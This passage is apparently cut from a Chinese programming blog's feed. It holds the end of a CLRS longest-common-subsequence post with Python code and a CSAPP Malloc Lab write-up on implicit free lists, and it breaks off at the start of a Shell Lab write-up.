<h2 id="u52A8_u6001_u89C4_u5212_u539F_u7406"><a href="#u52A8_u6001_u89C4_u5212_u539F_u7406" class="headerlink" title="动态规划原理"></a>动态规划原理</h2><h3 id="u6700_u4F18_u5B50_u7ED3_u6784"><a href="#u6700_u4F18_u5B50_u7ED3_u6784" class="headerlink" title="最优子结构"></a>最优子结构</h3><p>书中说了4条通用模式，简单点概况就是每个问题能被分成几个子问题，这几个子问题有解且都是最优解，那么这个问题就是这几个最优解的结合。构建最优子结构需要考虑这两个方面：</p>
<ol>
<li>原问题的最优解设计多少个子问题</li>
<li>确定最优解使用哪些子问题时，要考察多少种选择</li>
</ol>
<p>和递归不同，因为递归太深会出现异常。动态规划确实反过来，自底向上的使用最优子结构。也就是说，首先求得子问题的最优解，然后求原问题的最优解。</p>
<h3 id="u91CD_u53E0_u5B50_u95EE_u9898"><a href="#u91CD_u53E0_u5B50_u95EE_u9898" class="headerlink" title="重叠子问题"></a>重叠子问题</h3><p>如果递归算法反复求解相同的子问题，这就是最优化问题具有重叠子问题性质。动态规划对每个子问题求解一次，将解存入一个表中，这样当再次需要这个子问题时直接查表。</p>
<p>这里也提到了一种带备忘的自顶到下动态规划算法，时间复杂度和自底向上的动态规划算法一样。</p>
<h2 id="u6700_u957F_u516C_u5171_u5B50_u5E8F_u5217"><a href="#u6700_u957F_u516C_u5171_u5B50_u5E8F_u5217" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p>同之前的矩阵链乘法问题相似，还是要建立最优解的递归式。</p>
<p><img src="3.png" alt=""></p>
<p>书中的图15-8很形象,列举出了X=[A, B, C, B, D, A, B], Y=[B, D, C, A, B, A]得到的表c和表b。</p>
<p><img src="4.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">LCSLength</span><span class="params">(x, y)</span>:</span></div><div class="line">    m = len(x)</div><div class="line">    n = len(y)</div><div class="line">    b = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(n+<span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(m+<span class="number">1</span>)]</div><div class="line">    c = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(n+<span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(m+<span class="number">1</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, m+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>, n+<span class="number">1</span>):</div><div class="line">            <span class="keyword">if</span> x[i<span class="number">-1</span>] == y[j<span class="number">-1</span>]:</div><div class="line">                c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span></div><div class="line">                b[i][j] = <span class="string">'↖'</span></div><div class="line">            <span class="keyword">elif</span> c[i<span class="number">-1</span>][j] &gt;= c[i][j<span class="number">-1</span>]:</div><div class="line">                c[i][j] = c[i<span class="number">-1</span>][j]</div><div class="line">                b[i][j] = <span class="string">'↑'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                c[i][j] = c[i][j<span class="number">-1</span>]</div><div class="line">                b[i][j] = <span class="string">'←'</span></div><div class="line">    <span class="keyword">return</span> c, b</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrintLCS</span><span class="params">(b, x, i, j)</span>:</span></div><div class="line">    <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">or</span> j == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="keyword">if</span> b[i][j] == <span class="string">'↖'</span>:</div><div class="line">        PrintLCS(b, x, i<span class="number">-1</span>, j<span class="number">-1</span>)</div><div class="line">        <span class="keyword">print</span> x[i<span class="number">-1</span>],</div><div class="line">    <span class="keyword">elif</span> b[i][j] == <span class="string">'↑'</span>:</div><div class="line">        PrintLCS(b, x, i - <span class="number">1</span>, j)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        PrintLCS(b, x, i, j - <span class="number">1</span>)</div><div class="line">x = <span class="string">'ABCBDAB'</span>.strip()</div><div class="line">y = <span class="string">'BDCABA'</span>.strip()</div><div class="line">c, b = LCSLength(x, y)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(map(str, c))</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> i:</div><div class="line">        <span class="keyword">print</span> c,</div><div class="line">    <span class="keyword">print</span></div><div class="line"></div><div class="line">PrintLCS(b, x, len(x), len(y))</div></pre></td></tr></table></figure>
<p>结果分别显示了c， b和最长公共子序列。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[0, 0, 0, 0, 0, 0, 0]</div><div class="line">[0, 0, 0, 0, 1, 1, 1]</div><div class="line">[0, 1, 1, 1, 1, 2, 2]</div><div class="line">[0, 1, 1, 2, 2, 2, 2]</div><div class="line">[0, 1, 1, 2, 2, 3, 3]</div><div class="line">[0, 1, 2, 2, 2, 3, 3]</div><div class="line">[0, 1, 2, 2, 3, 3, 4]</div><div class="line">[0, 1, 2, 2, 3, 4, 4]</div><div class="line">0 0 0 0 0 0 0</div><div class="line">0 ↑ ↑ ↑ ↖ ← ↖</div><div class="line">0 ↖ ← ← ↑ ↖ ←</div><div class="line">0 ↑ ↑ ↖ ← ↑ ↑</div><div class="line">0 ↖ ↑ ↑ ↑ ↖ ←</div><div class="line">0 ↑ ↖ ↑ ↑ ↑ ↑</div><div class="line">0 ↑ ↑ ↑ ↖ ↑ ↖</div><div class="line">0 ↖ ↑ ↑ ↑ ↖ ↑</div><div class="line">B C B A</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      CLRS
    
    </summary>
    
    
      <category term="algorithm" scheme="http://xinqiu.me/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab6 解题分析</title>
    <link href="http://xinqiu.me/2016/08/11/csapp-lab6-malloclab/"/>
    <id>http://xinqiu.me/2016/08/11/csapp-lab6-malloclab/</id>
    <published>2016-08-10T16:00:00.000Z</published>
    <updated>2016-08-11T06:27:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>Malloc Lab，据说是最难的一个lab。在看完第九章之后，因为要旅游，没有直接做lab，而是继续看书，结果回来了，书还剩1章，又顺势看完了剩余的部分。在整本书都读完了以后，才回过头来做Malloc Lab。</p>
<h3 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h3><p>需要完成<code>mm.c</code>里的内容，材料中需要完成的是</p>
<ul>
<li>int mm_init(void)</li>
<li>void *mm_malloc(size_t size)</li>
<li>void mm_free(void *ptr)</li>
</ul>
<p>其他的mm_realloc源码中已经填写好了。</p>
<p>这里，我是用书中的隐式空闲链表方法，先完成实验。</p>
<a id="more"></a>
<h4 id="mm_init"><a href="#mm_init" class="headerlink" title="mm_init"></a>mm_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> * mm_init - initialize the malloc package.</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> ((head_listp = mem_sbrk(<span class="number">4</span>*WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    PUT(head_listp, <span class="number">0</span>);</div><div class="line">    PUT(head_listp + (<span class="number">1</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>));</div><div class="line">    PUT(head_listp + (<span class="number">2</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>));</div><div class="line">    PUT(head_listp + (<span class="number">3</span>*WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));</div><div class="line">    head_listp += (<span class="number">2</span>*WSIZE);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是一个初始化堆的函数。mm_init从内存中获取4个字的空间，并初始化城空闲链表。</p>
<p>其中堆块的形式是这样的</p>
<p><img src="2.png" alt=""></p>
<p>隐式空闲链表第一个字并没有用，这作为双字边界对齐的填充字。接着是prologue block，这和正常块的区别在于它没有payload，所以算是作为堆开始的标志，同样，epilogue block放在堆的结尾处。</p>
<p><img src="1.png" alt=""></p>
<p>上图为隐式空闲链表，每个regular block其实就上之前堆块图的结构。注意到蓝色的块是在初始化时产生的。mm_init就是做了以上的操作，首先调用mem_sbrk申请4个字的空间，首先第一个字填充为0。接着创建prologue block，因为prologue block是双字，也就是8-byte。接着创建epilogue block。接着将head_listp指针指向prologue block的结尾。虽然隐式空闲链表的头和尾都构建好了，但是没有分配空间给它，它限制并不能存任何东西。所以我们要对刚才的空闲链表进行扩展堆。默认扩展一个空堆CHUNKSIZE，这里定义的是1&lt;&lt;12也就是4K，4K也就是1000个字。</p>
<p>所以接着设计一个extend_heap函数。</p>
<h4 id="extend_heap"><a href="#extend_heap" class="headerlink" title="extend_heap"></a>extend_heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> *bp;</div><div class="line">    <span class="keyword">size_t</span> size;</div><div class="line"></div><div class="line">    size = (words % <span class="number">2</span>) ? (words+<span class="number">1</span>) * WSIZE : words * WSIZE;</div><div class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</div><div class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</div><div class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</div><div class="line"></div><div class="line">    <span class="keyword">return</span> coalesce(bp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>要知道内存块都是存在一种对齐机制，所以当分配奇数字时，要进行双字对齐。接着和初始化一样，调用mem_sbrk来获取空间。之后的内容和之前的mm_init类似，将bp所指的块的header和footer赋值为0，表示这个块是空闲块。将下一个块的header构造成epilogue block。</p>
<p>这里说个小插曲，为什么要双字对齐。我觉得是因为将最后一位留出来标记这个块是否被分配。只要是双字对齐后，那么这个数的二进制数最后一位肯定为0， 所以置为1代表已分配，置0代表未分配。如果不对齐，那么如果分配的是奇数，最后一位本来就为1，但若这个块并未分配，所以会影响判断。</p>
<p>在扩展完这个块以后，需要将这个块和之前的块进行合并。如果之前的块为空闲，则合并成更大的块来满足空间申请的请求。</p>
<h4 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> * bp)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</div><div class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</div><div class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc)</div><div class="line">        <span class="keyword">return</span> bp;</div><div class="line"></div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc)</div><div class="line">    &#123;</div><div class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</div><div class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</div><div class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc)</div><div class="line">    &#123;</div><div class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</div><div class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</div><div class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</div><div class="line">        bp = PREV_BLKP(bp);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">else</span> </div><div class="line">    &#123;</div><div class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));</div><div class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</div><div class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</div><div class="line">        bp = PREV_BLKP(bp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> bp;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>合并块有4种可能的情况。</p>
<p><img src="3.png" alt=""></p>
<p>上面代码的顺序和上图的顺序是一致的。所谓合并，就是修改上一个或者下一个块的头和尾中的size。使之变成合并后的size。</p>
<h4 id="mm_free"><a href="#mm_free" class="headerlink" title="mm_free"></a>mm_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</div><div class="line"></div><div class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</div><div class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</div><div class="line">    coalesce(ptr);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>释放块，其实就是将头和尾的标志位修改为0，然后将这个块与前一个块或者后一个块合并。</p>
<h4 id="mm_malloc"><a href="#mm_malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">/*</span></div><div class="line">    int newsize = ALIGN(size + SIZE_T_SIZE);</div><div class="line">    void *p = mem_sbrk(newsize);</div><div class="line">    if (p == (void *)-1)</div><div class="line">	return NULL;</div><div class="line">    else &#123;</div><div class="line">        *(size_t *)p = size;</div><div class="line">        return (void *)((char *)p + SIZE_T_SIZE);</div><div class="line">    &#125;</div><div class="line">    */</div><div class="line">    <span class="keyword">size_t</span> asize;</div><div class="line">    <span class="keyword">size_t</span> extendsize;</div><div class="line">    <span class="keyword">char</span> *bp;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (size &lt;= DSIZE)</div><div class="line">        asize = <span class="number">2</span> * DSIZE;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE<span class="number">-1</span>)) / DSIZE);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>)&#123;</div><div class="line">        place(bp, asize);</div><div class="line">        <span class="keyword">return</span> bp;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    extendsize = MAX(asize, CHUNKSIZE);</div><div class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize/WSIZE)) == <span class="literal">NULL</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">    place(bp, asize);</div><div class="line">    <span class="keyword">return</span> bp;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这算是最主要的部分了。分配内存主要分为对齐，最适搜索， 扩展堆。</p>
<p>对齐这个不难明白，就是如果申请的大小不是双字对齐，需要将其对齐，虽然这样会产生碎片。另外，参考之前的空堆结构可知，申请的空间最小要是16字节。其中8个字节存放头和尾，8个字节满足对齐要求。在调整了请求大小后，开始搜索空闲链表，寻找合适的空闲块。如果有，就放这个请求块，没有就需要申请新的空闲块来扩展堆,然后再放这个块。</p>
<p>这里用到了两个函数，find_fit和place，接着就要来完善这两个函数。</p>
<h4 id="find_fit"><a href="#find_fit" class="headerlink" title="find_fit"></a>find_fit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span></span></div><div class="line">&#123;   </div><div class="line">    <span class="keyword">void</span> *bp;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (bp = head_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))&#123;</div><div class="line">        <span class="keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;</div><div class="line">            <span class="keyword">return</span> bp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里是用首次适配搜索。从隐式空闲链表的开头开始，寻找首个合适的未分配的块。</p>
<h4 id="place"><a href="#place" class="headerlink" title="place"></a>place</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> asize)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= (<span class="number">2</span>*DSIZE))&#123;</div><div class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</div><div class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</div><div class="line">        bp = NEXT_BLKP(bp);</div><div class="line">        PUT(HDRP(bp), PACK(csize-asize, <span class="number">0</span>));</div><div class="line">        PUT(FTRP(bp), PACK(csize-asize, <span class="number">0</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</div><div class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>若是寻找到了合适的块，这时就要将这个块放进去。这里有两种情况，如果当前找到的块比需要填入的块大于或等于16字节，证明这个块还能够分裂成两个块，所以需要做分裂操作。不然就直接将这个整个块标记为已分配，也就是说这里存在小于16字节的碎片。</p>
<h4 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h4><p>隐式空闲链表可能说稍微容易点，得分87/100，这就证明其中有能够优化的地方，比如书中提到的显示空闲链表和分离链表，有机会我会再试试其他的方法，更巧妙的比如BST或者splay伸展树等等。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab5 解题分析</title>
    <link href="http://xinqiu.me/2016/07/12/csapp-lab5-shelllab/"/>
    <id>http://xinqiu.me/2016/07/12/csapp-lab5-shelllab/</id>
    <published>2016-07-11T16:00:00.000Z</published>
    <updated>2016-07-19T12:16:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个实验是要实现一个简易的shell程序，主要考虑的是异常和信号的处理。</p>
<!--toc-->
<h4 id="u524D_u671F_u5DE5_u4F5C"><a href="#u524D_u671F_u5DE5_u4F5C" class="headerlink" title="前期工作"></a>前期工作</h4><p>解压缩<code>shlab-handout.tar</code>，执行<code>make clean | make</code>,就可以得到编译好的文件。</p>
<p>文件夹中的<code>tshref</code>是正确的结果，可以用来验证。与其用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./sdriver.pl -t trace01.txt -s ./tsh -a &quot;-p&quot;</div></pre></td></tr></table></figure>
<p>来测试，我觉得实验手册里提到的另一种方法更好用，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">make test01</div></pre></td></tr></table></figure>
<p>这是对自己写的tsh进行测试，要想对tshref进行测试，只需要在后面的test前面添加一个<code>r</code>即可，也就是<code>make rtest01</code>。</p>
<a id="more"></a>
<h4 id="u9700_u8981_u5B9E_u73B0_u7684_u51FD_u6570"><a href="#u9700_u8981_u5B9E_u73B0_u7684_u51FD_u6570" class="headerlink" title="需要实现的函数"></a>需要实现的函数</h4><ul>
<li>void eval(char *cmdline) 执行用户输入的命令</li>
<li>int builtin_cmd(char **argv) 执行内部命令</li>
<li>void do_bgfg(char **argv) 执行bg和fg命令</li>
<li>void waitfg(pid_t pid) block进程直到它不再是前台进程</li>
<li>void sigchld_handler(int sig) SIGCHLD信号处理</li>
<li>void sigint_handler(int sig) SIGINT信号处理</li>
<li>void sigtstp_handler(int sig) SIGTSTP信号处理</li>
</ul>
<h4 id="builtin_cmd"><a href="#builtin_cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h4><p>这是比较好写的一个函数，我选择第一个把他完成。按照实验文档说的，当输入quit时，退出tsh。输入jobs就列出存在的job。输入fg/bg是前台后台执行命令。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> * builtin_cmd - If the user has typed a built-in command then execute</div><div class="line"> *    it immediately.  </div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"quit"</span>)) <span class="comment">// quit</span></div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"jobs"</span>)) <span class="comment">// jobs</span></div><div class="line">    &#123;</div><div class="line">        listjobs(jobs);</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"echo"</span>)) <span class="comment">// echo</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) <span class="comment">// bg or fg</span></div><div class="line">    &#123;  </div><div class="line">        do_bgfg(argv);</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>大概闲着无聊，添加了个最简易最简易的echo233.</p>
<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>执行函数算是基础，参考书中图8-23中的eval，可以大概知道eval函数应该是什么样子的。但那只是简易并有缺陷的shell，它并不能回收后台子进程，所以之后就要用到信号的相关知识。关于阻塞信号，可以用到以下三个函数:</p>
<ul>
<li>int sigemptyset(sigset_t *set);</li>
<li>int sigaddset(sigset_t *set, int signum);</li>
<li>int sigprocmask(int how, const sigset_t *set, sigset_t *oldset);</li>
</ul>
<p>这类似线程锁，SIG_BLOCK和SIG_UNBLOCK用来加锁和解除锁。是用sigprocmask来同步进程，可以保证父进程在相应的deletejob之前执行了addjob。</p>
<p>另外eval还要处理job的添加，这分前台执行和后台执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div 